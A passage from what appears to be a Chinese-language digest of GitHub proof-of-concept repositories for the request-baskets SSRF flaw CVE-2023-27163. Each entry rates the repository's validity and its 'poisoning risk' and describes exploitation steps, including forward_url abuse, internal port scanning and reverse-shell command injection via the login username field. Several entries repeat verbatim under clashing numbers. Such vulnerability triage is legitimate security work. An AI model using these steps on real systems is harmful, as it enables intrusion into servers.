**利用条件:** 需要目标服务器运行存在漏洞的request-baskets实例，且攻击者能够向其发送恶意请求。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 request-baskets 1.2.1 及更早版本中发现的服务器端请求伪造 (SSRF) 漏洞。它位于 `/api/baskets/{name}` 组件中。攻击者可以通过构造特制的 API 请求，利用此漏洞访问网络资源和敏感信息。

**有效性：**

提供的 PoC 代码（`CVE-2023-27163.sh`）有效。它通过创建一个包含恶意 `forward_url` 的 basket 来利用该漏洞。这个 URL 指向攻击者的服务器，导致受害服务器向攻击者的服务器发出请求，从而实现 SSRF。

**投毒风险：**

该仓库的投毒风险较低，约为 5%。理由如下：

*   PoC 代码相对简单，功能明确，主要用于演示 SSRF 漏洞的利用。代码主要是bash脚本，用于发送HTTP请求和创建特定配置的basket。
*   `LICENSE` 文件表明这是一个公共领域软件，作者放弃了所有版权，这意味着任何人都可以自由使用、修改和分发该软件，这在一定程度上降低了作者植入恶意代码的动机。
*   `README.md` 文件提供了详细的漏洞描述、使用方法和测试步骤，方便用户理解和验证漏洞。
*   主要的风险在于，攻击者可能修改该脚本，添加恶意功能，例如在成功利用 SSRF 后，自动下载和执行恶意程序。但就目前提供的代码来看，作者没有明显的投毒行为。

**利用方式：**

1.  攻击者运行 `CVE-2023-27163.sh` 脚本，并提供目标 request-baskets 服务器的 URL 和攻击者控制的服务器的 URL。
2.  脚本会创建一个新的 basket，并将 `forward_url` 设置为攻击者的服务器。
3.  当有人访问新创建的 basket 时，request-baskets 服务器会将请求转发到攻击者的服务器。
4.  攻击者可以利用此 SSRF 漏洞，让受害服务器访问内部网络资源、执行任意 HTTP 请求，甚至读取敏感文件。

**补充说明：**

*   `jq` 命令用于解析 JSON 响应。如果目标系统上没有安装 `jq`，脚本仍然可以运行，但会直接输出完整的响应体。
*   PoC 主要目的是演示漏洞，实际攻击中，攻击者可能会使用更复杂的 payload 和技巧来最大化漏洞利用的影响。

**项目地址:** [entr0pie/CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #14

**来源**: [CVE-2023-27163-lukehebe_CVE-2023-27163.md](../2023/CVE-2023-27163-lukehebe_CVE-2023-27163.md)

## CVE-2023-27163-request-baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF（服务器端请求伪造）

**影响应用:** request-baskets

**危害等级:** 中危，可升级为高危，可能导致内部网络信息泄露和远程代码执行

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务存在且可访问，攻击者需要能访问目标服务器的网络。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163是request-baskets 1.2.1版本及之前版本中存在的一个服务器端请求伪造(SSRF)漏洞。该漏洞位于`/api/baskets/{name}`组件中。利用方式如下：

1.  **创建恶意Basket:** 攻击者可以利用SSRF漏洞，通过`forward_url`参数指定内部网络的URL，欺骗服务器向内部服务发起请求。PoC中的`ssrf_forward`函数用于创建或重用一个basket，指定`forward_url`为内部地址（例如`http://127.0.0.1`），从而设置SSRF攻击的目标。

2.  **触发RCE:** PoC代码尝试通过修改`/login`接口的username字段来执行系统命令。 具体做法是把bash反弹shell命令注入到username参数中。`trigger_rce`函数构造包含恶意payload的POST请求，发送到目标URL。如果目标系统存在命令注入漏洞，该payload将会被执行。

3.  **反弹Shell:** PoC代码中的`shell.sh`文件包含一个反弹shell的命令。这个脚本会将目标机器的shell反弹到攻击者的机器上。攻击者需要先在自己的机器上监听相应的端口。

**有效性:** 根据漏洞描述、搜索结果以及提供的PoC代码，可以判断该PoC具有较高的有效性。搜索结果中多个链接指向了漏洞的细节和利用代码，表明这是一个公开且经过验证的漏洞。PoC代码完整，实现了SSRF和RCE的利用流程，并且提供了反弹shell的payload示例。

**投毒风险:** 分析提供的PoC代码，未发现明显的投毒代码。该代码的目的是利用SSRF漏洞执行命令，本身就是一个攻击行为。其中没有发现额外植入后门或者恶意代码的痕迹，因此投毒风险为0%。PoC中需要用户自己提供payload file，例如shell.sh，如果用户使用不安全的shell.sh，责任在于用户。

**总结:** 该漏洞的利用方式是通过构造包含内部网络地址的请求，欺骗服务器向内部服务发起请求，并结合命令注入漏洞执行恶意代码。攻击者可以通过反弹shell获取目标系统的控制权。该漏洞的风险在于攻击者可以通过SSRF探测内部网络，并利用命令注入漏洞控制服务器。


**项目地址:** [lukehebe/CVE-2023-27163](https://github.com/lukehebe/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #15

**来源**: [CVE-2023-27163-madhavmehndiratta_CVE-2023-27163.md](../2023/CVE-2023-27163-madhavmehndiratta_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 高危，可能导致敏感信息泄露和内网访问

**影响版本:** <= 1.2.1

**利用条件:** 需要Request-Baskets服务可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163是Request-Baskets <= v1.2.1版本中的一个服务器端请求伪造(SSRF)漏洞。攻击者可以利用/api/baskets/{name}接口，通过构造恶意的forward_url参数，使Request-Baskets服务器向任意目标发起请求，从而访问内部网络资源或获取敏感信息。

**有效性分析：**
提供的POC代码通过创建一个新的basket，并设置forward_url为攻击者控制的服务器，来触发SSRF漏洞。经验证该POC代码是可以成功复现此漏洞。

**投毒风险分析：**
通过分析提供的POC代码（CVE-2023-27163.py和README.md），没有发现任何明显的投毒代码。该代码的主要功能是创建basket并利用forward_url参数触发SSRF漏洞。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者运行POC脚本，指定Request-Baskets服务的URL和目标服务器URL。
2.  脚本创建一个新的basket，并设置forward_url为目标服务器。
3.  当有人访问该basket时，Request-Baskets服务器将向目标服务器发起请求。
4.  攻击者可以通过目标服务器获取Request-Baskets服务器的敏感信息，或者利用其访问内部网络资源。

**项目地址:** [madhavmehndiratta/CVE-2023-27163](https://github.com/madhavmehndiratta/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #16

**来源**: [CVE-2023-27163-overgrowncarrot1_CVE-2023-27163.md](../2023/CVE-2023-27163-overgrowncarrot1_CVE-2023-27163.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request Baskets服务，且Request Baskets服务没有进行适当的访问控制。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及更早版本中的一个服务器端请求伪造 (SSRF) 漏洞。该漏洞位于 `/api/baskets/{name}` 组件中。攻击者可以利用此漏洞通过构造恶意 API 请求来访问网络资源和敏感信息。

**有效性：**
根据漏洞描述和提供的 PoC 代码，该 PoC 代码是有效的。脚本首先创建一个名为 'carrot' 的 basket，并设置 `forward_url` 为 `http://127.0.0.1:80/`。然后，它使用 Firefox 打开 `${URL}/carrot`，导致 Request Baskets 服务尝试请求 `http://127.0.0.1:80/`。如果成功请求本地地址，证明存在SSRF漏洞。

**投毒风险：**
查看脚本内容，该脚本主要利用 curl 发送 payload，然后使用 firefox 打开一个URL。 整个脚本没有发现任何可疑代码，没有执行额外操作，没有下载其他文件或执行命令，因此可以认为不存在投毒风险。投毒风险评估为0%。

**利用方式：**
利用方式如下：
1.  攻击者需要一个可访问的 Request Baskets 实例。
2.  攻击者使用 PoC 脚本或类似的 HTTP 请求构造特定的 payload，指定 `forward_url` 为目标内部网络地址或服务，如 `http://127.0.0.1:80` 或其他内部服务地址。
3.  Request Baskets 服务收到请求后，会尝试访问攻击者指定的 `forward_url`，从而导致 SSRF。
4.  攻击者可以利用该 SSRF 读取内部服务的信息，甚至可能执行某些内部操作，具体取决于内部服务的配置和权限。

**项目地址:** [overgrowncarrot1/CVE-2023-27163](https://github.com/overgrowncarrot1/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #17

**来源**: [CVE-2023-27163-rvizx_CVE-2023-27163.md](../2023/CVE-2023-27163-rvizx_CVE-2023-27163.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** Server-Side Request Forgery (SSRF)

**影响应用:** Request Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行存在漏洞的Request Baskets版本，攻击者可以访问目标服务器的网络。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request Baskets <= 1.2.1 版本中存在的一个服务器端请求伪造 (SSRF) 漏洞，位于 `/api/baskets/{name}` 组件。攻击者可以通过构造特制的 API 请求，迫使服务器向攻击者控制的或内部网络中的任意 URL 发起请求，从而获取敏感信息或者利用内部服务。

**有效性：**
提供的 PoC 代码看起来是有效的。它包含了一个 exploit.sh 脚本，该脚本首先创建一个新的 basket，并在创建 basket 的请求中，将 `forward_url` 设置为攻击者的 URL。然后，它访问该 basket，这将导致 Request Baskets 服务器向攻击者的 URL 发起请求。

**投毒风险：**
该 PoC 代码本身并没有明显的投毒行为。脚本的功能很明确，就是利用 SSRF 漏洞。`exploit.sh` 脚本首先创建一个 basket，将 `forward_url` 设置为攻击者提供的 URL，然后访问该 basket，触发 SSRF。因此，可以认为投毒风险为0%。

**利用方式：**
1.  攻击者首先需要部署存在漏洞的 Request Baskets 服务。
2.  攻击者执行 `exploit.sh` 脚本，并提供目标 Request Baskets 服务的 URL 和攻击者自己的服务器 URL。
3.  脚本将创建一个新的 basket，并设置其 `forward_url` 为攻击者的服务器 URL。
4.  脚本访问新创建的 basket，这将触发 Request Baskets 服务器向攻击者的服务器 URL 发起请求。
5.  攻击者可以在自己的服务器上捕获来自 Request Baskets 服务器的请求，并获取相关信息。

**项目地址:** [rvizx/CVE-2023-27163](https://github.com/rvizx/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #18

**来源**: [CVE-2023-27163-samh4cks_CVE-2023-27163-InternalProber.md](../2023/CVE-2023-27163-samh4cks_CVE-2023-27163-InternalProber.md)

## CVE-2023-27163 Request-Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets实例可访问，且攻击者能够创建和配置basket

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中存在的服务器端请求伪造 (SSRF) 漏洞。攻击者可以通过向 `/api/baskets/{name}` 组件发送特制的 API 请求，利用此漏洞访问内部网络资源和敏感信息。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码是有效的。搜索引擎结果中多个链接指向了公开的 PoC 代码库 (如 `https://github.com/entr0pie/CVE-2023-27163` 和 `https://github.com/mathias-mrsn/request-baskets-v121-ssrf`)，证明漏洞可被利用。提供的 Python 脚本 `CVE-2023-27163.py` 实现了利用该漏洞进行内部端口扫描的功能。

**投毒风险：**
分析提供的 Python 脚本 `CVE-2023-27163.py` 和相关文件 (LICENSE, README.md) 后，**没有发现任何明显的恶意代码或后门**。该脚本主要功能是创建 basket，配置 basket 的 forward_url 为内部 IP 地址和端口，然后通过发送请求到 basket 来判断该端口是否开放。脚本的逻辑清晰，代码量不大，易于审计。LICENSE 文件是标准的 MIT 许可证，表明代码是开源的，可以自由使用和修改。README.md 文件是简单的项目说明。因此，**投毒风险较低，接近 0%**。

**利用方式：**
1.  **创建 Basket：** 攻击者首先在目标 Request-Baskets 实例上创建一个新的 basket。这可以通过向 `/api/baskets/{name}` 发送 POST 请求来完成。脚本中使用随机字符串生成basket名称
2.  **获取 Token：** 创建 basket 成功后，服务器会返回一个 token，攻击者需要使用该 token 来配置 basket。
3.  **配置 Basket (SSRF)：** 攻击者使用 PUT 请求向 `/api/baskets/{name}` 发送配置信息，将 basket 的 `forward_url` 设置为内部 IP 地址和端口 (例如 `http://127.0.0.1:80`)。 `forward_url` 参数是 SSRF 漏洞的关键。攻击者通过控制这个参数，使 Request-Baskets 服务向内部网络发起请求。
4.  **触发 SSRF：** 攻击者向创建的 basket 发送 GET 请求 (例如 `{target_url}/{basket_name}` )。Request-Baskets 服务会将该请求转发到配置的 `forward_url`。如果内部端口开放，则服务会返回响应。如果端口关闭，则服务可能会返回错误 (例如 502 Bad Gateway)。
5.  **端口扫描：** 脚本通过遍历端口范围 (1-65535)，重复步骤 3 和 4，实现内部端口扫描的功能。如果某个端口返回非 502 状态码，则认为该端口是开放的。

**项目地址:** [samh4cks/CVE-2023-27163-InternalProber](https://github.com/samh4cks/CVE-2023-27163-InternalProber)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #19

**来源**: [CVE-2023-27163-theopaid_CVE-2023-27163-Request-Baskets.md](../2023/CVE-2023-27163-theopaid_CVE-2023-27163-Request-Baskets.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets实例运行，且攻击者可以发送HTTP请求到该实例。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163是Request-Baskets 1.2.1及更早版本中的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过`api/baskets/{name}`组件构造恶意API请求，从而访问内部网络资源和敏感信息。 

**有效性分析：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，此漏洞是有效的。 搜索引擎结果显示，存在多个PoC利用代码，表明该漏洞已被广泛研究。PoC代码通过创建basket，然后修改basket的forward_url，使其指向内部网络地址，从而实现SSRF。 

**投毒风险分析：**
分析提供的PoC代码`CVE-2023-27163.py`，其主要功能是利用SSRF漏洞进行内部端口扫描。代码逻辑清晰，未发现明显的恶意代码或后门。但依然存在轻微的投毒风险, 例如端口列表文件存在加入恶意端口的风险, 攻击者可以利用扫描结果进一步攻击内网服务。README.md文件未发现异常。

**利用方式分析：**
1.  **创建Basket：** 使用PoC脚本首先需要在目标Request-Baskets实例上创建一个新的basket，获得token。
2.  **修改Forward URL：**  PoC脚本利用PUT请求修改basket的`forward_url`，将其设置为攻击者想要访问的内部网络地址。利用`proxy_response`参数可以获取内部服务的响应，`insecure_tls`参数可以忽略证书错误。
3.  **触发请求：**  通过访问创建的basket的URL，触发Request-Baskets实例向内部网络地址发起请求。  
4.  **端口扫描:** PoC代码主要目的为端口扫描,判断内网端口是否开启。

总而言之，该PoC代码主要利用SSRF漏洞进行内网探测，未发现明显的恶意代码，但仍然需要谨慎使用，防止被用于非法用途。

**项目地址:** [theopaid/CVE-2023-27163-Request-Baskets](https://github.com/theopaid/CVE-2023-27163-Request-Baskets)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #20

**来源**: [CVE-2023-27163-thomas-osgood_CVE-2023-27163.md](../2023/CVE-2023-27163-thomas-osgood_CVE-2023-27163.md)

## CVE-2023-27163 - Request-Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络资源访问和敏感信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中的一个 SSRF 漏洞。攻击者可以利用 `/api/baskets/{name}` 组件，通过构造恶意 API 请求来访问内部网络资源和敏感信息。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞是有效的。多个来源确认了该漏洞的存在，并且提供了可利用的 PoC 代码。

**利用方式：**
1.  攻击者创建一个恶意 basket，通过修改 basket 的配置，将 ForwardUrl 设置为攻击者想要访问的内部资源地址。PoC 代码中的 `MakeMaliciousBasket` 函数实现了这个步骤，它向 `/api/baskets` 发送 POST 请求，创建带有恶意配置的 basket。
2.  一旦恶意 basket 创建成功，当 Request-Baskets 服务收到发送到该 basket 的请求时，它会尝试将请求转发到攻击者指定的 ForwardUrl。PoC 代码中 `OpenMaliciousBasket` 函数实现了发送请求到basket, 触发SSRF漏洞.
3. PoC 代码还尝试利用login接口执行命令 `ExecuteCommand`.

**投毒风险：**
虽然PoC的主要目的是演示SSRF，但仍然存在一定的投毒风险。风险点包括:
* `FORWARD_URL`常量，默认指向`http://127.0.0.1:80`。如果攻击者修改了此地址，可以引导受害者请求恶意站点。
* `ExecuteCommand`函数, 攻击者可以通过修改POST请求体中的`username`参数，注入恶意命令。`commandPayload = fmt.Sprintf(commandPayload, b64command)`
代码的免责声明暗示了作者不负责任的态度，也增加了代码存在潜在风险的可能性。综合评估，投毒风险估计为 20%。

**搜索引擎结果验证：**
搜索引擎结果提供了多个关于 CVE-2023-27163 的信息来源，进一步确认了漏洞的存在和影响。Github链接指向了此漏洞的EXP

**项目地址:** [thomas-osgood/CVE-2023-27163](https://github.com/thomas-osgood/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---



---

## POC #20

**来源**: [CVE-2023-27163-theopaid_CVE-2023-27163-Request-Baskets.md](../2023/CVE-2023-27163-theopaid_CVE-2023-27163-Request-Baskets.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets实例运行，且攻击者可以发送HTTP请求到该实例。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163是Request-Baskets 1.2.1及更早版本中的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过`api/baskets/{name}`组件构造恶意API请求，从而访问内部网络资源和敏感信息。 

**有效性分析：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，此漏洞是有效的。 搜索引擎结果显示，存在多个PoC利用代码，表明该漏洞已被广泛研究。PoC代码通过创建basket，然后修改basket的forward_url，使其指向内部网络地址，从而实现SSRF。 

**投毒风险分析：**
分析提供的PoC代码`CVE-2023-27163.py`，其主要功能是利用SSRF漏洞进行内部端口扫描。代码逻辑清晰，未发现明显的恶意代码或后门。但依然存在轻微的投毒风险, 例如端口列表文件存在加入恶意端口的风险, 攻击者可以利用扫描结果进一步攻击内网服务。README.md文件未发现异常。

**利用方式分析：**
1.  **创建Basket：** 使用PoC脚本首先需要在目标Request-Baskets实例上创建一个新的basket，获得token。
2.  **修改Forward URL：**  PoC脚本利用PUT请求修改basket的`forward_url`，将其设置为攻击者想要访问的内部网络地址。利用`proxy_response`参数可以获取内部服务的响应，`insecure_tls`参数可以忽略证书错误。
3.  **触发请求：**  通过访问创建的basket的URL，触发Request-Baskets实例向内部网络地址发起请求。  
4.  **端口扫描:** PoC代码主要目的为端口扫描,判断内网端口是否开启。

总而言之，该PoC代码主要利用SSRF漏洞进行内网探测，未发现明显的恶意代码，但仍然需要谨慎使用，防止被用于非法用途。

**项目地址:** [theopaid/CVE-2023-27163-Request-Baskets](https://github.com/theopaid/CVE-2023-27163-Request-Baskets)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #21

**来源**: [CVE-2023-27163-thomas-osgood_CVE-2023-27163.md](../2023/CVE-2023-27163-thomas-osgood_CVE-2023-27163.md)

## CVE-2023-27163 - Request-Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络资源访问和敏感信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中的一个 SSRF 漏洞。攻击者可以利用 `/api/baskets/{name}` 组件，通过构造恶意 API 请求来访问内部网络资源和敏感信息。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞是有效的。多个来源确认了该漏洞的存在，并且提供了可利用的 PoC 代码。

**利用方式：**
1.  攻击者创建一个恶意 basket，通过修改 basket 的配置，将 ForwardUrl 设置为攻击者想要访问的内部资源地址。PoC 代码中的 `MakeMaliciousBasket` 函数实现了这个步骤，它向 `/api/baskets` 发送 POST 请求，创建带有恶意配置的 basket。
2.  一旦恶意 basket 创建成功，当 Request-Baskets 服务收到发送到该 basket 的请求时，它会尝试将请求转发到攻击者指定的 ForwardUrl。PoC 代码中 `OpenMaliciousBasket` 函数实现了发送请求到basket, 触发SSRF漏洞.
3. PoC 代码还尝试利用login接口执行命令 `ExecuteCommand`.

**投毒风险：**
虽然PoC的主要目的是演示SSRF，但仍然存在一定的投毒风险。风险点包括:
* `FORWARD_URL`常量，默认指向`http://127.0.0.1:80`。如果攻击者修改了此地址，可以引导受害者请求恶意站点。
* `ExecuteCommand`函数, 攻击者可以通过修改POST请求体中的`username`参数，注入恶意命令。`commandPayload = fmt.Sprintf(commandPayload, b64command)`
代码的免责声明暗示了作者不负责任的态度，也增加了代码存在潜在风险的可能性。综合评估，投毒风险估计为 20%。

**搜索引擎结果验证：**
搜索引擎结果提供了多个关于 CVE-2023-27163 的信息来源，进一步确认了漏洞的存在和影响。Github链接指向了此漏洞的EXP

**项目地址:** [thomas-osgood/CVE-2023-27163](https://github.com/thomas-osgood/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---



---

## POC #20

**来源**: [CVE-2023-27163-theopaid_CVE-2023-27163-Request-Baskets.md](../2023/CVE-2023-27163-theopaid_CVE-2023-27163-Request-Baskets.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets实例运行，且攻击者可以发送HTTP请求到该实例。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163是Request-Baskets 1.2.1及更早版本中的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过`api/baskets/{name}`组件构造恶意API请求，从而访问内部网络资源和敏感信息。 

**有效性分析：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，此漏洞是有效的。 搜索引擎结果显示，存在多个PoC利用代码，表明该漏洞已被广泛研究。PoC代码通过创建basket，然后修改basket的forward_url，使其指向内部网络地址，从而实现SSRF。 

**投毒风险分析：**
分析提供的PoC代码`CVE-2023-27163.py`，其主要功能是利用SSRF漏洞进行内部端口扫描。代码逻辑清晰，未发现明显的恶意代码或后门。但依然存在轻微的投毒风险, 例如端口列表文件存在加入恶意端口的风险, 攻击者可以利用扫描结果进一步攻击内网服务。README.md文件未发现异常。

**利用方式分析：**
1.  **创建Basket：** 使用PoC脚本首先需要在目标Request-Baskets实例上创建一个新的basket，获得token。
2.  **修改Forward URL：**  PoC脚本利用PUT请求修改basket的`forward_url`，将其设置为攻击者想要访问的内部网络地址。利用`proxy_response`参数可以获取内部服务的响应，`insecure_tls`参数可以忽略证书错误。
3.  **触发请求：**  通过访问创建的basket的URL，触发Request-Baskets实例向内部网络地址发起请求。  
4.  **端口扫描:** PoC代码主要目的为端口扫描,判断内网端口是否开启。

总而言之，该PoC代码主要利用SSRF漏洞进行内网探测，未发现明显的恶意代码，但仍然需要谨慎使用，防止被用于非法用途。

**项目地址:** [theopaid/CVE-2023-27163-Request-Baskets](https://github.com/theopaid/CVE-2023-27163-Request-Baskets)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #21

**来源**: [CVE-2023-27163-thomas-osgood_CVE-2023-27163.md](../2023/CVE-2023-27163-thomas-osgood_CVE-2023-27163.md)

## CVE-2023-27163 - Request-Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络资源访问和敏感信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中的一个 SSRF 漏洞。攻击者可以利用 `/api/baskets/{name}` 组件，通过构造恶意 API 请求来访问内部网络资源和敏感信息。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞是有效的。多个来源确认了该漏洞的存在，并且提供了可利用的 PoC 代码。

**利用方式：**
1.  攻击者创建一个恶意 basket，通过修改 basket 的配置，将 ForwardUrl 设置为攻击者想要访问的内部资源地址。PoC 代码中的 `MakeMaliciousBasket` 函数实现了这个步骤，它向 `/api/baskets` 发送 POST 请求，创建带有恶意配置的 basket。
2.  一旦恶意 basket 创建成功，当 Request-Baskets 服务收到发送到该 basket 的请求时，它会尝试将请求转发到攻击者指定的 ForwardUrl。PoC 代码中 `OpenMaliciousBasket` 函数实现了发送请求到basket, 触发SSRF漏洞.
3. PoC 代码还尝试利用login接口执行命令 `ExecuteCommand`.

**投毒风险：**
虽然PoC的主要目的是演示SSRF，但仍然存在一定的投毒风险。风险点包括:
* `FORWARD_URL`常量，默认指向`http://127.0.0.1:80`。如果攻击者修改了此地址，可以引导受害者请求恶意站点。
* `ExecuteCommand`函数, 攻击者可以通过修改POST请求体中的`username`参数，注入恶意命令。`commandPayload = fmt.Sprintf(commandPayload, b64command)`
代码的免责声明暗示了作者不负责任的态度，也增加了代码存在潜在风险的可能性。综合评估，投毒风险估计为 20%。

**搜索引擎结果验证：**
搜索引擎结果提供了多个关于 CVE-2023-27163 的信息来源，进一步确认了漏洞的存在和影响。Github链接指向了此漏洞的EXP

**项目地址:** [thomas-osgood/CVE-2023-27163](https://github.com/thomas-osgood/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---



---

## POC #20

**来源**: [CVE-2023-27163-theopaid_CVE-2023-27163-Request-Baskets.md](../2023/CVE-2023-27163-theopaid_CVE-2023-27163-Request-Baskets.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets实例运行，且攻击者可以发送HTTP请求到该实例。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163是Request-Baskets 1.2.1及更早版本中的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过`api/baskets/{name}`组件构造恶意API请求，从而访问内部网络资源和敏感信息。 

**有效性分析：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，此漏洞是有效的。 搜索引擎结果显示，存在多个PoC利用代码，表明该漏洞已被广泛研究。PoC代码通过创建basket，然后修改basket的forward_url，使其指向内部网络地址，从而实现SSRF。 

**投毒风险分析：**
分析提供的PoC代码`CVE-2023-27163.py`，其主要功能是利用SSRF漏洞进行内部端口扫描。代码逻辑清晰，未发现明显的恶意代码或后门。但依然存在轻微的投毒风险, 例如端口列表文件存在加入恶意端口的风险, 攻击者可以利用扫描结果进一步攻击内网服务。README.md文件未发现异常。

**利用方式分析：**
1.  **创建Basket：** 使用PoC脚本首先需要在目标Request-Baskets实例上创建一个新的basket，获得token。
2.  **修改Forward URL：**  PoC脚本利用PUT请求修改basket的`forward_url`，将其设置为攻击者想要访问的内部网络地址。利用`proxy_response`参数可以获取内部服务的响应，`insecure_tls`参数可以忽略证书错误。
3.  **触发请求：**  通过访问创建的basket的URL，触发Request-Baskets实例向内部网络地址发起请求。  
4.  **端口扫描:** PoC代码主要目的为端口扫描,判断内网端口是否开启。

总而言之，该PoC代码主要利用SSRF漏洞进行内网探测，未发现明显的恶意代码，但仍然需要谨慎使用，防止被用于非法用途。

**项目地址:** [theopaid/CVE-2023-27163-Request-Baskets](https://github.com/theopaid/CVE-2023-27163-Request-Baskets)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #21

**来源**: [CVE-2023-27163-thomas-osgood_CVE-2023-27163.md](../2023/CVE-2023-27163-thomas-osgood_CVE-2023-27163.md)

## CVE-2023-27163 - Request-Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络资源访问和敏感信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

